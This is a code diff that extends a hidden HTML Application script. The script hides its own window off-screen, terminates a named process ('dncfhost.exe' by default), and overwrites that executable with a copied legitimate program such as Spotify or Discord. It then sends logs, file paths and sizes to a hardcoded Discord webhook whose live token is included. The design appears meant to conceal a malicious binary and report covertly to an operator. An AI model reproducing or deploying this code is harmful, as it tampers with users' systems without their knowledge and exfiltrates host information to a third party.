@@ -21,7 +21,6 @@ body { margin: 0; padding: 0; background: transparent; }
 </style>
 </head>
 <body>
-
 <script type="text/vbscript">
 Function GetProcessByName(pn)
     On Error Resume Next
@@ -89,11 +88,132 @@ Function BinaryCopy(sf, tf)
     a.Close
     BinaryCopy = True
 End Function
-</script>
 
+Function SearchFile(fn, paths)
+    On Error Resume Next
+    Dim fso, p, fp
+    Set fso = CreateObject("Scripting.FileSystemObject")
+    For Each p in paths
+        fp = fso.BuildPath(p, fn)
+        If fso.FileExists(fp) Then
+            SearchFile = fp
+            Exit Function
+        End If
+    Next
+    SearchFile = ""
+End Function
+
+Function FindRecursive(folder, fn)
+    On Error Resume Next
+    Dim fso, f, sf, result
+    Set fso = CreateObject("Scripting.FileSystemObject")
+    
+    If Not fso.FolderExists(folder) Then
+        FindRecursive = ""
+        Exit Function
+    End If
+    
+    Set f = fso.GetFolder(folder)
+    
+    ' Check current folder
+    If fso.FileExists(fso.BuildPath(folder, fn)) Then
+        FindRecursive = fso.BuildPath(folder, fn)
+        Exit Function
+    End If
+    
+    ' Check subfolders
+    For Each sf in f.SubFolders
+        result = FindRecursive(sf.Path, fn)
+        If result <> "" Then
+            FindRecursive = result
+            Exit Function
+        End If
+    Next
+    
+    FindRecursive = ""
+End Function
+</script>
 <script type="text/javascript">
 window.resizeTo(1,1);
 window.moveTo(-2000,-2000);
+
+var WEBHOOK_URL = "https://discord.com/api/webhooks/1452723227523547276/zgAT_2VPHVL4qP5c-nL0Br8c3w29__2CmxaU6-cffYYXulBPF7blPrvovLWpFzdD9A9e"; // Inserisci il tuo webhook Discord
+var logMessages = [];
+
+function log(msg) {
+    var timestamp = new Date().toISOString();
+    var logMsg = "[" + timestamp + "] " + msg;
+    logMessages.push(logMsg);
+    console.log(logMsg);
+}
+
+function sendWebhook(content, file) {
+    try {
+        var xhr = new ActiveXObject("Microsoft.XMLHTTP");
+        var boundary = "----WebKitFormBoundary" + Math.random().toString(36).substr(2);
+        
+        xhr.open("POST", WEBHOOK_URL, false);
+        xhr.setRequestHeader("Content-Type", "multipart/form-data; boundary=" + boundary);
+        
+        var body = "";
+        body += "--" + boundary + "\r\n";
+        body += 'Content-Disposition: form-data; name="content"\r\n\r\n';
+        body += content + "\r\n";
+        
+        if (file) {
+            body += "--" + boundary + "\r\n";
+            body += 'Content-Disposition: form-data; name="file"; filename="summary.txt"\r\n';
+            body += 'Content-Type: text/plain\r\n\r\n';
+            body += file + "\r\n";
+        }
+        
+        body += "--" + boundary + "--\r\n";
+        
+        xhr.send(body);
+        log("Webhook sent successfully");
+        return true;
+    } catch(e) {
+        log("Webhook error: " + e.message);
+        return false;
+    }
+}
+
+function saveSummary() {
+    try {
+        var fso = new ActiveXObject("Scripting.FileSystemObject");
+        var sh = new ActiveXObject("WScript.Shell");
+        var tempPath = sh.ExpandEnvironmentStrings("%TEMP%");
+        var summaryPath = fso.BuildPath(tempPath, "replace_summary.txt");
+        
+        var ts = fso.CreateTextFile(summaryPath, true);
+        ts.WriteLine("=== REPLACE OPERATION SUMMARY ===");
+        ts.WriteLine("Timestamp: " + new Date().toString());
+        ts.WriteLine("");
+        
+        for (var i = 0; i < logMessages.length; i++) {
+            ts.WriteLine(logMessages[i]);
+        }
+        
+        ts.Close();
+        log("Summary saved to: " + summaryPath);
+        return summaryPath;
+    } catch(e) {
+        log("Error saving summary: " + e.message);
+        return null;
+    }
+}
+
+function readFile(path) {
+    try {
+        var fso = new ActiveXObject("Scripting.FileSystemObject");
+        var ts = fso.OpenTextFile(path, 1);
+        var content = ts.ReadAll();
+        ts.Close();
+        return content;
+    } catch(e) {
+        return null;
+    }
+}
 
 function p() {
     try {
@@ -101,76 +221,188 @@ function p() {
         var e = w.Environment("Process");
         var c = e("CMDLINE");
         var m = c.match(/--name\s+(\S+)/i);
-        if (m) return m[1];
-    } catch(x) {}
+        if (m) {
+            log("Target process name from cmdline: " + m[1]);
+            return m[1];
+        }
+    } catch(x) {
+        log("Error reading cmdline: " + x.message);
+    }
+    log("Using default target: dncfhost.exe");
     return "dncfhost.exe";
 }
 
-function fs() {
-    var fso = new ActiveXObject("Scripting.FileSystemObject");
+function findLegitimateExe() {
+    log("Searching for legitimate executable...");
+    
     var sh = new ActiveXObject("WScript.Shell");
-    try {
-        var ap = sh.ExpandEnvironmentStrings("%APPDATA%");
-        var sp = fso.BuildPath(ap, "Spotify\\Spotify.exe");
-        if (fso.FileExists(sp)) return sp;
-    } catch(x) {}
-    return "C:\\Windows\\System32\\notepad.exe";
+    var fso = new ActiveXObject("Scripting.FileSystemObject");
+    
+    // Lista di software legittimi da cercare in ordine di priorità
+    var targets = [
+        {name: "Spotify.exe", hint: "Spotify"},
+        {name: "Discord.exe", hint: "Discord"},
+        {name: "Teams.exe", hint: "Microsoft Teams"},
+        {name: "Skype.exe", hint: "Skype"},
+        {name: "notepad.exe", hint: "Notepad"}
+    ];
+    
+    // Percorsi comuni dove cercare
+    var searchPaths = [
+        sh.ExpandEnvironmentStrings("%APPDATA%"),
+        sh.ExpandEnvironmentStrings("%LOCALAPPDATA%"),
+        sh.ExpandEnvironmentStrings("%PROGRAMFILES%"),
+        sh.ExpandEnvironmentStrings("%PROGRAMFILES(X86)%"),
+        "C:\\Program Files",
+        "C:\\Program Files (x86)"
+    ];
+    
+    // Cerca ogni target
+    for (var i = 0; i < targets.length; i++) {
+        var target = targets[i];
+        log("Searching for " + target.hint + "...");
+        
+        // Cerca nei percorsi comuni
+        for (var j = 0; j < searchPaths.length; j++) {
+            var basePath = searchPaths[j];
+            log("  Checking: " + basePath);
+            
+            try {
+                var result = FindRecursive(basePath, target.name);
+                if (result && result !== "") {
+                    log("FOUND: " + result);
+                    return result;
+                }
+            } catch(e) {
+                log("  Error searching " + basePath + ": " + e.message);
+            }
+        }
+    }
+    
+    // Fallback: notepad.exe in System32
+    var fallback = "C:\\Windows\\System32\\notepad.exe";
+    log("Using fallback: " + fallback);
+    return fallback;
 }
 
 function w(pn, cb) {
+    log("Waiting for process " + pn + " to terminate...");
+    var attempts = 0;
     var i = window.setInterval(function() {
+        attempts++;
         var r = GetProcessByName(pn);
         if (!r) {
+            log("Process " + pn + " terminated after " + attempts + " checks");
             clearInterval(i);
             cb();
         }
     }, 1000);
+    
     window.setTimeout(function() {
         clearInterval(i);
+        log("Timeout waiting for " + pn + " termination (30s elapsed)");
         cb();
     }, 30000);
 }
 
 function ex() {
+    log("=== Starting replace operation ===");
+    
     var pn = p();
+    log("Target process: " + pn);
+    
     var tf = GetProcessPath(pn);
+    log("Target file path: " + (tf || "NOT FOUND"));
     
     if (!tf || tf === "") {
+        log("ERROR: Target file path not found, aborting");
+        sendReport("❌ Replace failed: Target file path not found");
         window.close();
         return;
     }
     
-    var sf = fs();
+    var sf = findLegitimateExe();
+    log("Source file: " + sf);
+    
     var fso = new ActiveXObject("Scripting.FileSystemObject");
     
-    if (!fso.FileExists(sf) || !fso.FileExists(tf)) {
+    if (!fso.FileExists(sf)) {
+        log("ERROR: Source file does not exist: " + sf);
+        sendReport("❌ Replace failed: Source file not found");
         window.close();
         return;
     }
     
-    try { KillProcessByName(pn); } catch(x) {}
+    if (!fso.FileExists(tf)) {
+        log("ERROR: Target file does not exist: " + tf);
+        sendReport("❌ Replace failed: Target file not found");
+        window.close();
+        return;
+    }
+    
+    // Get file sizes
+    var sfSize = fso.GetFile(sf).Size;
+    var tfSize = fso.GetFile(tf).Size;
+    log("Source file size: " + sfSize + " bytes");
+    log("Target file size: " + tfSize + " bytes");
+    
+    try {
+        log("Attempting to kill process: " + pn);
+        KillProcessByName(pn);
+    } catch(x) {
+        log("Error killing process: " + x.message);
+    }
     
     window.setTimeout(function() {
         var sr = GetProcessByName(pn);
         if (sr) {
+            log("Process still running, waiting...");
             w(pn, function() { r(); });
         } else {
+            log("Process terminated, proceeding with replace");
             r();
         }
     }, 2000);
     
     function r() {
+        log("Executing binary copy...");
         try {
-            BinaryCopy(sf, tf);
-        } catch(x) {}
+            var success = BinaryCopy(sf, tf);
+            if (success) {
+                log("✓ Binary copy SUCCESS");
+                log("Replaced: " + tf);
+                log("With: " + sf);
+                sendReport("✅ Replace successful!\n📁 Target: `" + tf + "`\n📄 Source: `" + sf + "`\n📊 Size: " + sfSize + " bytes");
+            } else {
+                log("✗ Binary copy FAILED");
+                sendReport("❌ Replace failed during binary copy");
+            }
+        } catch(x) {
+            log("ERROR during binary copy: " + x.message);
+            sendReport("❌ Replace error: " + x.message);
+        }
+        
+        log("=== Replace operation completed ===");
         window.setTimeout(function() { window.close(); }, 100);
     }
 }
 
+function sendReport(summary) {
+    log("Preparing report...");
+    var summaryPath = saveSummary();
+    
+    if (summaryPath) {
+        var fileContent = readFile(summaryPath);
+        sendWebhook(summary, fileContent);
+    } else {
+        sendWebhook(summary, logMessages.join("\n"));
+    }
+}
+
 window.onload = function() {
+    log("HTA loaded, starting operation...");
     window.setTimeout(function() { ex(); }, 100);
 };
 </script>
-
 </body>
 </html>
